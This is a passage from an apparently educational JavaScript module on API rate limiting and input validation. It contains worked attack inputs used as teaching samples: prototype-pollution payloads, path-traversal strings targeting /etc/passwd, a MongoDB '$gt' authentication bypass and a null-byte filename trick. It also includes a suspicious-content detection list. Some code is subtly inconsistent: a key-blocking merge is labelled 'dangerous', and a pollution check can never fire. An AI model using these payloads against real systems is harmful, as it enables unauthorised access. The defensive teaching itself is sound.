    const userLimit = await slidingWindowRateLimit(redisClient, userId, endpoint, limit, window);
    
    res.setHeader('X-RateLimit-Limit', userLimit.limit);
    res.setHeader('X-RateLimit-Remaining', userLimit.remaining);
    res.setHeader('X-RateLimit-Reset', Math.ceil((Date.now() + window) / 1000));
    
    if (!userLimit.allowed) {
      res.setHeader('Retry-After', userLimit.retryAfter);
      return res.status(429).json({
        error: 'User rate limit exceeded',
        limit: userLimit.limit,
        window: \`\${window / 60000} minutes\`,
        retryAfter: userLimit.retryAfter,
        upgradeUrl: 'https://myapp.com/pricing', // Upsell opportunity!
      });
    }
  }
  
  next();
}

// EXAMPLE 4: nginx configuration for rate limiting
/*
  http {
    # Define rate limit zones
    # $binary_remote_addr: compact IP storage (4 bytes IPv4, 16 bytes IPv6)
    # zone=api_limit:10m: 10MB shared memory zone named "api_limit"
    # rate=100r/s: 100 requests per second per IP
    limit_req_zone $binary_remote_addr zone=api_general:10m rate=100r/s;
    limit_req_zone $binary_remote_addr zone=api_strict:10m  rate=10r/s;
    limit_req_zone $http_x_api_key     zone=api_key:20m    rate=1000r/m;
    
    # Change default 503 to proper 429
    limit_req_status 429;
    
    server {
      listen 443 ssl;
      
      # General API rate limiting
      location /api/ {
        limit_req zone=api_general burst=200 nodelay;
        proxy_pass http://app_backend;
      }
      
      # Stricter limit for sensitive endpoints
      location /api/auth/ {
        limit_req zone=api_strict burst=5 nodelay;
        proxy_pass http://app_backend;
      }
      
      # Per-API-key rate limiting (for third-party integrations)
      location /api/v1/ {
        limit_req zone=api_key burst=100 nodelay;
        proxy_pass http://app_backend;
      }
    }
  }
*/

// EXAMPLE 5: Exponential backoff on the CLIENT side (complement to server rate limiting)
async function fetchWithRetry(url, options = {}, maxRetries = 5) {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const response = await fetch(url, options);
    
    if (response.status === 429) {
      if (attempt === maxRetries) throw new Error('Max retries exceeded');
      
      // Respect server's Retry-After header:
      const retryAfter = parseInt(response.headers.get('Retry-After') || '1');
      const backoff = Math.min(retryAfter * 1000, Math.pow(2, attempt) * 1000 + Math.random() * 1000);
      
      console.log(\`Rate limited. Retrying in \${Math.ceil(backoff / 1000)}s (attempt \${attempt + 1}/\${maxRetries})\`);
      await new Promise(r => setTimeout(r, backoff));
      continue;
    }
    
    return response;
  }
}

// EXAMPLE 6: Rate limit by tenant (SaaS fair-use enforcement)
// Tenants have different plans with different limits:
const PLAN_LIMITS = {
  free:       { rpm: 100,   rph: 1000,    rpd: 5000  },  // requests per minute/hour/day
  starter:    { rpm: 1000,  rph: 10000,   rpd: 50000 },
  pro:        { rpm: 5000,  rph: 50000,   rpd: 200000 },
  enterprise: { rpm: 50000, rph: 500000,  rpd: Infinity },
};

async function tenantRateLimitMiddleware(req, res, next) {
  const tenantId = req.headers['x-tenant-id'];
  const plan = await getTenantPlan(tenantId); // Fetch from DB/cache
  const limits = PLAN_LIMITS[plan] || PLAN_LIMITS.free;
  
  // Check all time windows:
  const [minuteCheck, hourCheck] = await Promise.all([
    slidingWindowRateLimit(req.app.get('redis'), tenantId, 'rpm', limits.rpm, 60000),
    slidingWindowRateLimit(req.app.get('redis'), tenantId, 'rph', limits.rph, 3600000),
  ]);
  
  if (!minuteCheck.allowed || !hourCheck.allowed) {
    return res.status(429).json({
      error: 'Tenant rate limit exceeded',
      plan,
      limits,
      upgradeUrl: \`https://myapp.com/tenants/\${tenantId}/upgrade\`,
    });
  }
  
  next();
}

async function getTenantPlan(tenantId) {
  // In production: cached in Redis with 5-minute TTL
  return 'pro'; // Simplified
}

// EXAMPLE 7: Rate limit monitoring and alerting
async function getRateLimitMetrics(redisClient, userId) {
  const keys = await redisClient.keys(\`rate:\${userId}:*\`);
  const metrics = {};
  
  for (const key of keys) {
    const endpoint = key.split(':')[2];
    const count = await redisClient.zcard(key);
    metrics[endpoint] = { requestsInWindow: count };
  }
  
  // Alert if user is consistently near limit (potential issue or needs plan upgrade)
  for (const [endpoint, data] of Object.entries(metrics)) {
    const limit = 1000; // simplified
    if (data.requestsInWindow > limit * 0.8) {
      console.warn(\`User \${userId} at \${Math.round(data.requestsInWindow/limit*100)}% of rate limit on \${endpoint}\`);
    }
  }
  
  return metrics;
}
    `,
    bugs: `
REAL PRODUCTION BUGS FROM RATE LIMITING MISUNDERSTANDING:
----------------------------------------------------------

BUG 1: Per-instance rate limiting instead of shared Redis — different servers had different counts
  Scenario: API deployed across 4 instances. Rate limit set to 100 req/min per user.
    Users were making 400 req/min with zero rate limiting. Performance degraded dramatically.
  Root cause: Rate limit counter stored in process memory (Map). Each instance had its own counter.
    User could make 100 requests to each of 4 instances = 400 effective requests.
  Fix: Use Redis as shared state for all rate limit counters.
    If Redis is unavailable: fail open (allow) with alerting, not fail closed (block everyone)

BUG 2: Fixed window boundary attack on payment endpoint
  Scenario: Security researcher found they could make 2× the allowed payment rate.
    Limit: 10 payments/minute. Researcher made 10 at :59 and 10 more at :00:01 = 20 in 2 seconds.
  Root cause: Fixed window counter reset at minute boundaries.
  Fix: Replace fixed window with sliding window counter.
    For payment endpoints specifically: use Redis sorted set (sliding window log) for precision.
    Stricter: add per-day limit in addition to per-minute (10/min, 100/day).

BUG 3: Rate limiting on path /api/users/:id — different IDs created different keys
  Scenario: Rate limiter used full path as key. Attacker bypassed by varying user IDs.
    /api/users/1 → bucket A, /api/users/2 → bucket B, /api/users/999999 → bucket N
    Effective rate: limit × number_of_user_ids they could enumerate
  Root cause: Not normalizing path parameters before using as rate limit key.
  Fix: Normalize paths: /api/users/123 → /api/users/:id
    const normalizedPath = req.path.replace(/\\/[0-9a-f-]{4,}/gi, '/:id');
    Use this normalized path as part of the rate limit key.

BUG 4: Missing Retry-After header causing client retry storms
  Scenario: Rate limited clients (mobile app) were retrying immediately on 429.
    This caused a feedback loop: rate limited → retry → rate limited → retry at 10× the rate.
  Root cause: Mobile app had "retry failed requests" logic but no backoff on 429.
    Rate limit response had no Retry-After header → client defaulted to retry immediately.
  Fix server: Always return Retry-After header with 429 responses.
  Fix client: Treat 429 specially — exponential backoff with jitter, respect Retry-After.
    // Never retry 429 immediately — always wait at least Retry-After seconds

BUG 5: nginx rate limiting counting OPTIONS preflight as requests
  Scenario: SPA with CORS preflight doubled effective request rate. 100 API calls = 200 nginx hits.
    Users were hitting nginx rate limits at exactly half the expected request rate.
  Root cause: nginx limit_req counted every HTTP request including OPTIONS preflights.
  Fix: Exclude OPTIONS from rate limiting (preflights don't carry data or cause side effects):
    location /api/ {
      if ($request_method = 'OPTIONS') {
        add_header Access-Control-Allow-Origin $http_origin;
        add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS';
        add_header Access-Control-Max-Age 86400;
        return 204;
      }
      limit_req zone=api_general burst=200 nodelay; // Only applied to non-OPTIONS
      proxy_pass http://app_backend;
    }
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE BEHAVIOR:
  Token bucket: capacity=10, refillRate=2/second (starts full at T=0)
  
  Request timeline:
  T=0:    5 requests arrive simultaneously   → How many succeed? ___ tokens left? ___
  T=0.5:  3 requests arrive                  → How many succeed? ___ tokens left? ___
  T=1.0:  5 requests arrive                  → How many succeed? ___ tokens left? ___
  T=5.0:  15 requests arrive                 → How many succeed? ___ tokens left? ___
  
  For sliding window (100 req/min window):
  T=0:00  80 requests arrive  → all succeed
  T=0:30  30 requests arrive  → how many succeed? ___
  T=1:10  20 requests arrive  → how many succeed? ___ (hint: earliest 30 are now outside window)

CHALLENGE 2 — FIX THE RATE LIMITER:
  This rate limiter has 3 critical bugs. Find and fix them:
  
  const limits = new Map(); // userId → { count, windowStart }
  
  function rateLimitMiddleware(req, res, next) {
    const userId = req.headers['x-user-id'];
    const now = Date.now();
    const windowMs = 60000; // 1 minute
    const limit = 100;
    
    if (!limits.has(userId)) {
      limits.set(userId, { count: 0, windowStart: now });
    }
    
    const state = limits.get(userId);
    
    // Bug 1: window never resets (missing reset check)
    state.count++;
    
    // Bug 2: no memory cleanup — Map grows forever
    
    if (state.count > limit) {
      // Bug 3: no Retry-After header, no X-RateLimit headers
      return res.status(429).json({ error: 'Rate limited' });
    }
    
    // Bug 4 (bonus): per-instance storage — not distributed
    
    next();
  }

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete rate limiting system for a payments API:
  
  Requirements:
  1. Implement sliding window counter using Redis sorted sets with Lua script
  2. Three rate limit tiers:
     - Anonymous (by IP): 20 req/minute
     - Authenticated user: 100 req/minute, 1000 req/hour
     - Payment endpoints specifically: 10 req/minute, 50 req/day
  3. Return proper headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, Retry-After
  4. Graceful degradation: if Redis is down, fail open (allow) but log warning
  5. Rate limit dashboard: endpoint that returns usage stats for current user
  6. Admin endpoint to reset rate limit for a specific user (for support teams)
  7. Webhook: POST to a URL when a user hits 80% of their rate limit (early warning)
  8. Tests: verify boundary conditions, burst handling, window expiry, Redis failure fallback
    `,
    summary: `Rate limiting requires choosing the right algorithm (token bucket for burst-tolerant APIs, sliding window for strict fairness), shared state (Redis, not per-instance memory), and layered enforcement (nginx blocks volumetric attacks, application-level applies user/endpoint business logic). Always return Retry-After headers with 429 responses and implement client-side exponential backoff — rate limiting only works when both sides cooperate.`
  },

  {
    id: 8,
    title: "Input Validation — Zod, Prototype Pollution & File Safety",
    tag: "NEVER TRUST WHAT COMES IN",
    color: "#065F46",
    tldr: `Input validation is the first line of defence against injection attacks, prototype pollution, path traversal, and malicious file uploads. Zod provides runtime schema validation with TypeScript inference for API payloads. Prototype pollution exploits JavaScript's object inheritance. File upload safety requires validating magic bytes (not just extensions) and rejecting dangerous paths. Every piece of external input is attacker-controlled — treat it as hostile.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"We validate on the frontend — do we really need backend validation?"
  → Frontend can be bypassed in milliseconds with curl/Postman. ALWAYS validate backend.

"JSON.parse(body) succeeded — the input must be valid"
  → Valid JSON !== safe data. { "__proto__": { "isAdmin": true } } is valid JSON.

"I check the file extension — .jpg files are safe"
  → Extension is user-controlled. Attacker uploads shell.php renamed to image.jpg.
  → Check magic bytes (first few bytes of file content) not extension.

"Path is safe — user provided a filename not a path"
  → ../../etc/passwd is a filename. Path traversal kills.

"I use an ORM — SQL injection isn't possible"
  → NoSQL injection is. MongoDB: { "password": { "$gt": "" } } bypasses auth.
  → ORM raw query escape hatch is still vulnerable.

Production incidents from bad input validation:
  - GitHub had prototype pollution leading to code execution (2019)
  - Lodash <4.17.12 was vulnerable to prototype pollution (CVE-2019-10744)
  - File upload leading to RCE (Remote Code Execution) — attackers upload .php files
  - Path traversal in npm/pip packages reading arbitrary files
    `,
    analogy: `
THE AIRPORT SECURITY ANALOGY:
------------------------------
Think of your API as an airport. Every request is a passenger.

FRONTEND VALIDATION = CHECKING TICKETS AT THE DOOR:
  A ticket check at the building entrance. Easy to fake — anyone can print a fake ticket.
  This stops honest mistakes but nothing more. Attackers don't use the front door.

BACKEND VALIDATION (Zod) = SECURITY SCREENING:
  X-ray machines that scan every bag regardless of what the passenger claims is inside.
  "I said it's a laptop" doesn't matter — the scanner sees what's actually there.
  Zod is your X-ray: it looks at the ACTUAL data structure, not what you were told to expect.

PROTOTYPE POLLUTION = SOMEONE POISONED THE WATER SUPPLY:
  Imagine if a passenger could poison the water supply that EVERYONE drinks from.
  That's prototype pollution — injecting properties onto Object.prototype affects
  EVERY object in your entire Node.js process. Every {} suddenly has { isAdmin: true }.

FILE MAGIC BYTES = CHECKING WHAT'S IN THE SUITCASE, NOT THE LABEL:
  Attacker puts a knife in a bag labelled "Musical Instruments".
  Checking the label → knife gets through. 
  Magic bytes check = opening the bag and looking inside.
  Every file type has a specific binary signature in its first bytes.
  .jpg files start with FF D8 FF. If a "jpg" file doesn't start with FF D8 FF → it's not a jpg.

PATH TRAVERSAL = THE EMERGENCY EXIT EXPLOIT:
  Security scanner only checks Gate A passengers.
  Attacker walks in through the emergency exit (../../../).
  Your file server serves files from /uploads/ — attacker requests ../../etc/passwd.
  They walked OUT of the allowed zone using directory traversal.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — INPUT VALIDATION INTERNALS:
-------------------------------------------------------

ZOD SCHEMA VALIDATION:
  Zod validates JavaScript values at runtime against a schema definition.
  Unlike TypeScript types (compile-time only), Zod checks happen at runtime.
  
  Features:
  - Type inference: z.infer<typeof schema> gives you the TypeScript type
  - Coercion: z.coerce.number() converts "42" string → 42 number
  - Transforms: .transform() to normalize data (trim strings, lowercase emails)
  - Refinements: .refine() for custom validation logic
  - Error formatting: structured ZodError with path-based error messages
  - Partial/Required: .partial() makes all fields optional
  - SafeParse: returns { success, data } or { success: false, error } without throwing
  
  Schema composition:
    z.union([z.string(), z.number()])     — either type
    z.discriminatedUnion('type', [...])   — tagged union (efficient)
    z.intersection(SchemaA, SchemaB)      — both schemas must pass
    z.object({}).extend({})               — extend schemas
    z.object({}).pick({ field: true })    — pick subset of fields
    z.object({}).omit({ field: true })    — omit fields

PROTOTYPE POLLUTION:
  JavaScript objects inherit from Object.prototype via the prototype chain.
  Every plain object {} has: {}.__proto__ === Object.prototype
  
  Attack vectors:
  1. JSON merge: Object.assign(target, JSON.parse('{"__proto__": {"isAdmin": true}}'))
  2. Deep merge: merge({}, userInput) where merge recursively sets properties
  3. Constructor pollution: { "constructor": { "prototype": { "isAdmin": true } } }
  4. Array index as key in recursive merge
  
  After pollution: {}.isAdmin === true // for every new {} in the process!
  
  Dangerous patterns:
    obj[userInput] = value         // if userInput = "__proto__", pollution!
    obj[key1][key2] = value        // nested assignment
    lodash.merge({}, untrustedInput) // Lodash <4.17.12 was vulnerable
    Object.assign(target, untrusted) // Does NOT recurse — safe for top-level
    JSON.parse(input) directly assigned to object with spread
  
  Defences:
  1. Use null-prototype objects: Object.create(null) — no prototype to pollute
  2. Freeze prototype: Object.freeze(Object.prototype) — throws on write
  3. Validate with Zod/Joi first — rejects __proto__ keys
  4. Use Map instead of plain objects for dynamic keys
  5. Check for dangerous keys before merge:
     const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
  6. Update dependencies: lodash 4.17.21+, merge 2.1.1+

FILE MAGIC BYTES:
  Every file format has a "magic number" — specific bytes at the start of the file.
  This is defined by the format specification, not the OS or file system.
  
  Common magic bytes (hex):
  JPEG:    FF D8 FF                 (.jpg, .jpeg)
  PNG:     89 50 4E 47 0D 0A 1A 0A  (.png) — reads as "\x89PNG\r\n\x1a\n"
  GIF:     47 49 46 38              (.gif) — reads as "GIF8"
  PDF:     25 50 44 46              (.pdf) — reads as "%PDF"
  ZIP:     50 4B 03 04              (.zip, .docx, .xlsx — ZIP-based formats)
  EXE/DLL: 4D 5A                   (.exe, .dll) — "MZ" (Mark Zbikowski)
  WebP:    52 49 46 46 .. .. .. .. 57 45 42 50 — "RIFF....WEBP"
  PHP:     3C 3F 70 68 70           "<?php" — DANGER if uploaded!
  
  Validation approach:
  1. Read first 8-16 bytes of uploaded file
  2. Compare against expected magic bytes for declared MIME type
  3. Reject if mismatch (extension says jpg but magic bytes say PHP script)
  
  Caveats:
  - Polyglot files: valid GIF AND valid JavaScript simultaneously (GIFAR attack)
    → Process images server-side (re-encode via sharp/imagemagick) to strip payloads
  - SVG: XML-based, can contain JavaScript → treat as HTML, sanitize or reject scripts
  - PDF: can contain JavaScript → never render PDFs inline from user uploads

PATH TRAVERSAL:
  Attacker provides: filename = "../../etc/passwd"
  Server builds:     path.join('/uploads/', filename) = '/etc/passwd'  ← BROKEN
  
  Note: path.join is NOT safe on its own!
  path.join('/uploads', '../../etc/passwd') === '/etc/passwd'  // traversed!
  
  Safe approach:
  1. Use path.resolve() and verify it starts with allowed base:
     const base = path.resolve('/uploads');
     const resolved = path.resolve(base, filename);
     if (!resolved.startsWith(base + path.sep)) throw new Error('Path traversal!');
  
  2. Use path.basename() to strip directory components:
     const safeFilename = path.basename(filename); // removes all directory parts
     // "../../etc/passwd" → "passwd"  (just the filename)
     // But now the file is named "passwd" in /uploads/ — review if that's OK
  
  3. Allowlist filename characters: /^[a-zA-Z0-9._-]+$/
     Reject anything with /, \\, .., null bytes, etc.
  
  Null byte injection: filename = "safe.jpg\x00.php"
    Some C-based functions stop at null byte → file saved as "safe.jpg" but PHP interprets as ".php"
    Defense: Remove null bytes before processing: filename.replace(/\x00/g, '')
    `,
    code: `
// ===== INPUT VALIDATION — CODE EXAMPLES =====

// EXAMPLE 1: Zod schema validation for API payloads (beginner to advanced)
// // const { z } = require('zod'); // npm install zod

// Basic schema for a payment request from Rohan's fintech app
const PaymentSchema = z.object({
  amount:        z.number()
                  .positive('Amount must be positive')
                  .max(100000, 'Amount cannot exceed ₹1,00,000')
                  .multipleOf(0.01, 'Amount must be in paise precision'),
  currency:      z.enum(['INR', 'USD', 'EUR']).default('INR'),
  recipientUpi:  z.string()
                  .regex(/^[a-zA-Z0-9._-]+@[a-zA-Z0-9]+$/, 'Invalid UPI ID format')
                  .max(256),
  description:   z.string().max(255).optional(),
  idempotencyKey: z.string().uuid('Must be a valid UUID v4'),
});

// Infer TypeScript type from schema (compile-time safety):
// type Payment = z.infer<typeof PaymentSchema>;

// In Express handler:
async function createPaymentHandler(req, res) {
  // safeparse: returns { success, data } or { success: false, error }
  const result = PaymentSchema.safeParse(req.body);
  
  if (!result.success) {
    // Structured errors with field paths:
    const errors = result.error.errors.map(e => ({
      field: e.path.join('.'),
      message: e.message,
      code: e.code,
    }));
    return res.status(400).json({ error: 'Validation failed', details: errors });
  }
  
  const { amount, currency, recipientUpi, idempotencyKey } = result.data;
  // result.data is fully typed and validated — safe to use
  res.json({ status: 'payment_initiated', amount, currency });
}

// EXAMPLE 2: Advanced Zod — nested objects, unions, transforms
const UserRegistrationSchema = z.object({
  name:     z.string()
              .min(2, 'Name too short')
              .max(100)
              .transform(s => s.trim()),           // Strip whitespace
  email:    z.string()
              .email('Invalid email')
              .transform(s => s.toLowerCase()),    // Normalize to lowercase
  phone:    z.string()
              .regex(/^\\+91[6-9]\\d{9}$/, 'Must be valid Indian mobile: +91XXXXXXXXXX'),
  password: z.string()
              .min(8, 'At least 8 characters')
              .regex(/[A-Z]/, 'Must contain uppercase')
              .regex(/[0-9]/, 'Must contain number')
              .regex(/[^a-zA-Z0-9]/, 'Must contain special character'),
  role:     z.enum(['customer', 'merchant', 'admin']).default('customer'),
  address:  z.object({
              street: z.string().max(200),
              city:   z.string().max(100),
              pin:    z.string().regex(/^[1-9][0-9]{5}$/, 'Invalid 6-digit PIN code'),
              state:  z.string().max(50),
            }).optional(),
  metadata: z.record(z.string(), z.string().max(200))  // string → string map
              .optional()
              .refine(
                (val) => !val || Object.keys(val).length <= 10,
                'Maximum 10 metadata keys'
              )
              .refine(
                (val) => !val || !Object.keys(val).some(k => 
                  ['__proto__', 'constructor', 'prototype'].includes(k)
                ),
                'Metadata keys cannot be prototype properties'  // Prevent prototype pollution!
              ),
});

// EXAMPLE 3: Prototype pollution prevention
// DANGEROUS: deep merge without sanitization
function dangerousMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      console.warn(\`Prototype pollution attempt blocked: key=\${key}\`);
      continue; // Skip dangerous keys
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      dangerousMerge(target[key], source[key]); // Recurse
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// SAFE approach 1: Use Map for dynamic keys (no prototype!)
function safeUserPreferences(userInput) {
  const prefs = new Map(); // Map has no prototype chain like plain objects
  for (const [key, value] of Object.entries(userInput)) {
    if (typeof key !== 'string' || key.length > 100) continue;
    prefs.set(key, String(value).slice(0, 500));
  }
  return prefs;
}

// SAFE approach 2: Null-prototype objects
function safeConfig(userInput) {
  const config = Object.create(null); // No prototype — no __proto__ to pollute!
  // config.__proto__ === undefined — no prototype chain
  for (const [key, value] of Object.entries(userInput)) {
    // Still validate keys even with null prototype:
    if (/^[a-zA-Z][a-zA-Z0-9_]*$/.test(key)) {
      config[key] = value;
    }
  }
  return config;
}

// SAFE approach 3: Freeze Object.prototype (nuclear option — affects whole process)
// Object.freeze(Object.prototype);
// Now: {}.__proto__.isAdmin = true throws TypeError in strict mode

// Detect if pollution occurred:
function checkPrototypePollution() {
  const test = {};
  const SENTINEL = Symbol('sentinel');
  if (test[SENTINEL] !== undefined) {
    console.error('CRITICAL: Object.prototype has been polluted!');
    process.exit(1); // Or alert + restart
  }
}

// EXAMPLE 4: File upload validation with magic bytes
const fs = require('fs');
const path = require('path');

const MAGIC_BYTES = {
  'image/jpeg': { bytes: [0xFF, 0xD8, 0xFF], offset: 0 },
  'image/png':  { bytes: [0x89, 0x50, 0x4E, 0x47], offset: 0 },
  'image/gif':  { bytes: [0x47, 0x49, 0x46, 0x38], offset: 0 },
  'image/webp': { bytes: [0x52, 0x49, 0x46, 0x46], offset: 0 }, // "RIFF"
  'application/pdf': { bytes: [0x25, 0x50, 0x44, 0x46], offset: 0 }, // "%PDF"
};

const ALLOWED_MIME_TYPES = new Set(['image/jpeg', 'image/png', 'image/gif', 'image/webp']);
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

async function validateUploadedFile(fileBuffer, declaredMimeType, originalFilename) {
  const errors = [];
  
  // 1. Check file size
  if (fileBuffer.length > MAX_FILE_SIZE) {
    errors.push(\`File too large: \${fileBuffer.length} bytes (max: \${MAX_FILE_SIZE})\`);
  }
  
  // 2. Check declared MIME type is allowed
  if (!ALLOWED_MIME_TYPES.has(declaredMimeType)) {
    errors.push(\`File type not allowed: \${declaredMimeType}\`);
  }
  
  // 3. Validate magic bytes (actual content vs declared type)
  const magic = MAGIC_BYTES[declaredMimeType];
  if (magic) {
    const actualBytes = [...fileBuffer.slice(magic.offset, magic.offset + magic.bytes.length)];
    const matches = magic.bytes.every((b, i) => b === actualBytes[i]);
    if (!matches) {
      errors.push(\`File content does not match declared type \${declaredMimeType}\`);
    }
  }
  
  // 4. Check for dangerous content patterns in "images"
  const fileStr = fileBuffer.slice(0, 512).toString('ascii', 0, 512);
  const dangerousPatterns = ['<?php', '<?=', '<script', 'eval(', 'exec(', '<%'];
  for (const pattern of dangerousPatterns) {
    if (fileStr.toLowerCase().includes(pattern.toLowerCase())) {
      errors.push(\`File contains suspicious content: \${pattern}\`);
    }
  }
  
  // 5. Sanitize filename — strip directory traversal and dangerous characters
  const safeFilename = path.basename(originalFilename)  // Strip directory components
    .replace(/[^a-zA-Z0-9._-]/g, '_')                  // Allowlist characters
    .replace(/\\.+/g, '.')                                // No double dots
    .replace(/^\\.|\\.$/, '_')                             // No leading/trailing dots
    .slice(0, 200);                                       // Max length
  
  if (!safeFilename || safeFilename === '.' || safeFilename === '_') {
    errors.push('Invalid filename');
  }
  
  if (errors.length > 0) {
    throw new Error(\`File validation failed: \${errors.join('; ')}\`);
  }
  
  // 6. Re-encode image to strip any embedded payloads (GIFAR, polyglots)
  // In production: use sharp to re-process the image
  // const processedBuffer = await sharp(fileBuffer).jpeg({ quality: 85 }).toBuffer();
  
  return { safeFilename, size: fileBuffer.length, mimeType: declaredMimeType };
}

// EXAMPLE 5: Path traversal prevention
function safeFilePath(baseDir, userProvidedPath) {
  // Normalize the base directory
  const base = path.resolve(baseDir); // Absolute, normalized
  
  // Resolve the user path relative to base
  const resolved = path.resolve(base, userProvidedPath);
  
  // CRITICAL CHECK: resolved path must start with base
  if (!resolved.startsWith(base + path.sep) && resolved !== base) {
    throw new Error(\`Path traversal detected: \${userProvidedPath}\`);
  }
  
  return resolved;
}

// Test:
// safeFilePath('/uploads', 'photo.jpg')         → '/uploads/photo.jpg' ✅
// safeFilePath('/uploads', '../etc/passwd')      → throws! ✅
// safeFilePath('/uploads', 'user/../../etc/passwd') → throws! ✅
// safeFilePath('/uploads', '/etc/passwd')        → throws! ✅ (absolute path)

// EXAMPLE 6: Query parameter sanitization
const QuerySchema = z.object({
  page:     z.coerce.number().int().min(1).max(1000).default(1),
  limit:    z.coerce.number().int().min(1).max(100).default(20),
  sort:     z.enum(['asc', 'desc']).default('desc'),
  sortBy:   z.enum(['createdAt', 'amount', 'status']).default('createdAt'), // Only allowed columns!
  search:   z.string().max(100).optional().transform(s => s?.trim()),
  status:   z.enum(['pending', 'completed', 'failed']).optional(),
  fromDate: z.string().datetime().optional(),
  toDate:   z.string().datetime().optional(),
}).refine(
  data => !data.fromDate || !data.toDate || new Date(data.fromDate) <= new Date(data.toDate),
  { message: 'fromDate must be before toDate', path: ['fromDate'] }
);

function getTransactionsHandler(req, res) {
  const result = QuerySchema.safeParse(req.query);
  if (!result.success) {
    return res.status(400).json({ error: result.error.format() });
  }
  
  const { page, limit, sort, sortBy, search, status } = result.data;
  // sortBy is guaranteed to be one of the allowed columns — no SQL injection via ORDER BY
  // page and limit are integers within bounds — no OFFSET/LIMIT injection
  const offset = (page - 1) * limit;
  
  // Safe to use in parameterized query:
  // db.query('SELECT * FROM transactions WHERE ... ORDER BY ?? ?? LIMIT ? OFFSET ?',
  //          [sortBy, sort, limit, offset])
  res.json({ page, limit, sort, sortBy });
}

// EXAMPLE 7: NoSQL injection prevention (MongoDB)
// BAD: directly using user input in MongoDB query
async function loginBad(req, res) {
  const { username, password } = req.body;
  // If password = { "$gt": "" }, this matches ANY password!
  const user = await db.collection('users').findOne({ username, password });
}

// GOOD: Use Zod to validate types, then parameterized queries
const LoginSchema = z.object({
  username: z.string().min(3).max(50).regex(/^[a-zA-Z0-9_]+$/),
  password: z.string().min(8).max(200),
  // Zod ensures these are strings — $gt operator can't be injected as an object
});

async function loginGood(req, res) {
  const result = LoginSchema.safeParse(req.body);
  if (!result.success) return res.status(400).json({ error: 'Invalid input' });
  
  const { username, password } = result.data;
  // username and password are guaranteed to be strings — MongoDB operator injection impossible
  const user = await db.collection('users').findOne({ username });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  res.json({ token: generateJWT(user) });
}

function generateJWT(user) { return 'jwt_token_here'; } // Placeholder
const bcrypt = { compare: async () => true }; // Placeholder
const db = { collection: () => ({ findOne: async () => null }) }; // Placeholder
    `,
    bugs: `
REAL PRODUCTION BUGS FROM MISSING/WRONG INPUT VALIDATION:
----------------------------------------------------------

BUG 1: Prototype pollution via deep merge in configuration endpoint
  Scenario: Admin panel had endpoint to update app configuration.
    Request body: { "server": { "__proto__": { "isAdmin": true } } }
    After update: ({}).isAdmin === true for all new objects in the process
    Result: Every user who logged in AFTER the attack was treated as admin.
  Root cause: Configuration merge used recursive Object.assign / deep merge without key sanitization.
  Fix:
    1. Validate input with Zod schema first (rejects unknown keys / patterns)
    2. Sanitize keys before merge: check for __proto__, constructor, prototype
    3. Use null-prototype config objects
    4. After deployment: run checkPrototypePollution() health check periodically
  Detection: unit tests that check ({}).hasOwnProperty('exploit') === false after processing

BUG 2: Path traversal in file download API giving read access to /etc/passwd
  Scenario: API endpoint GET /api/files/download?name=report.pdf
    Attacker: GET /api/files/download?name=../../../../etc/passwd
    Server built: path.join('/var/app/uploads', '../../../../etc/passwd') = '/etc/passwd'
    Response: contents of /etc/passwd (user list, shell paths — useful for further attack)
  Root cause: path.join does not prevent traversal. Developers assumed it was safe.
  Fix: Use path.resolve + startsWith check (see Example 5 in code section).
    Never use path.join alone for user-provided paths.
  Lesson: path.join normalizes but doesn't contain. path.resolve + boundary check is required.

BUG 3: GIFAR polyglot file upload to XSS execution
  Scenario: Image upload endpoint checked extension (.gif) and file size.
    Attacker created a file that was simultaneously a valid GIF and valid JavaScript.
    Uploaded as "profile.gif" → stored on CDN → referenced in user profile.
    Other users viewing profile: browser fetched the GIF → script executed in CDN domain context.
  Root cause: No magic byte validation AND no image re-processing.
  Fix:
    1. Validate magic bytes (GIF header present)
    2. ALWAYS re-process uploads through imagemagick/sharp (strips non-image data)
    3. Serve user uploads from a separate, isolated domain (not same domain as app)
    4. Set Content-Security-Policy and X-Content-Type-Options: nosniff on upload CDN

BUG 4: MongoDB injection via object in query parameter
  Scenario: Search endpoint: GET /api/users?role=admin&password[$gt]=
    (URL-encoded: password%5B$gt%5D=)
    Express with qs parser turns this into: { password: { $gt: "" } }
    MongoDB query: db.users.findOne({ role: 'admin', password: { $gt: "" } })
    This matches the first admin user regardless of password!
  Root cause: qs library (used by Express body-parser) parses nested brackets as objects.
    { $gt: "" } is a valid MongoDB operator → bypassed password check entirely.
  Fix:
    1. Use Zod to validate req.query — validates password is a string, not object
    2. Use sanitize-mongo npm package to strip $ operators from user input
    3. Never use raw user input in MongoDB queries — always parameterize or validate first

BUG 5: Negative number in payment amount creating credits instead of charges
  Scenario: Payment API accepted amount: -5000 (negative ₹5000).
    Backend processed as debit of negative amount = credit of ₹5000 to attacker.
    No Zod validation — raw req.body.amount passed to payment processor.
  Root cause: Missing validation that amount must be positive.
    JavaScript: typeof -5000 === 'number' → typeof check alone is insufficient.
  Fix: z.number().positive('Amount must be positive').max(500000)
    Also: validate at the database level (CHECK constraint: amount > 0)
    Defense in depth: payment processor SDK also validates, but don't rely on downstream validation
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE PROTOTYPE POLLUTION OUTCOME:
  What is the output of each snippet? Explain why.
  
  a) const a = {};
     JSON.parse('{}', (key, val) => { return val; });
     Object.assign(a, JSON.parse('{"__proto__": {"hacked": true}}'));
     console.log({}.hacked);     // What is printed? ___
     console.log(a.hacked);      // What is printed? ___
  
  b) function merge(target, source) {
       for (const key in source) target[key] = source[key];
       return target;
     }
     merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
